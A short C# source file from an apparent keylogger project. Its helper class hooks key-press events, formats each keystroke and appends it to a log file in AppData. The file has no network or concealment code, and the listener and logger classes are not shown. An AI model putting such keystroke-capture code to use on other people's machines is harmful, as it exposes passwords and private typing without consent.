using System;

namespace KeyLogger
{
    public class LogListenerHelper : IDisposable
    {
        public LogListenerHelper(KeyListener listener)
        {
            Listener = listener;
            Listener.KeyPressedEvent += Listener_KeyPressedEvent;
            Listener.IsListening = true;

            KeyFormatter = new KeyFormatter();
            AppDataLogger = new AppDataLogger(1024 * 1024);
        }

        public KeyListener Listener { get; }
        public KeyFormatter KeyFormatter { get; }
        public AppDataLogger AppDataLogger { get; }

        private void Listener_KeyPressedEvent(int keyCode, bool keyDown)
        {
            var formatted = KeyFormatter.FormatKeyPress(keyCode, keyDown);

            AppDataLogger.Write(formatted);
        }

        public void Dispose()
        {
            AppDataLogger?.Dispose();
        }
    }
}
